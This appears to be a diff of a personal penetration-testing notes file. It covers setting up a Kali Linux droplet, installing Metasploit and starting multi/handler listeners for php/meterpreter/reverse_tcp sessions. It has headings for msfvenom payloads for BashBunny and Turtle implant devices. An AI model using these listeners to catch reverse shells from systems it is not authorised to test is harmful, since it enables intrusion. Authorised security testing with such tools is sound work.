@@ -1,3 +1,25 @@
+#DROPLET CONFIG ALL
+#INITIAL KALI INSTALL
+nano /etc/apt/sources.list
+deb http://http.kali.org/kali kali-rolling main contrib non-free
+apt-get update
+apt-get install kali-archive-keyring
+apt-get update
+apt-cache search kali-linux
+apt-get install kali-linux-full -y
+reboot
+apt-get update -y
+apt-get upgrade 
+apt-get dist-upgrade
+reboot
+
+#MSF Community 
+#FIRST INSTALL
+sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev
+#THEN
+git clone https://github.com/rapid7/metasploit-framework.git
+gem install bundle
+bundle install
 
 cd metasploit-framework
 ./msfconsole
@@ -8,27 +30,15 @@ set LHOST 0.0.0.0
 set ExitOnSession false
 exploit -j
 
-TURTLE
 cd metasploit-framework
 ./msfconsole
 use multi/handler
 set PAYLOAD php/meterpreter/reverse_tcp
-set LPORT 443
-set LHOST 0.0.0.0
 set LPORT 4444
+set LHOST 0.0.0.0
 set exitonsession false
 exploit -j
 
-
-
-#INITIAL KALI INSTALL
-nano /etc/apt/sources.list
-deb http://http.kali.org/kali kali-rolling main contrib non-free
-apt-get update
-apt-get install kali-archive-keyring
-apt-get update
-apt-cache search kali-linux
-apt-get install kali-linux-top10 -y
 
 MSFVENOM FOR BASHBUNNY
 
@@ -171,13 +181,7 @@ set LHOST 0.0.0.0
 set ExitOnSession false
 exploit -j
 
-#MSF Community 
-#FIRST INSTALL
-sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev
-#THEN
-git clone https://github.com/rapid7/metasploit-framework.git
-gem install bundle
-bundle install
+
 
 msfconsole
 db_nmap
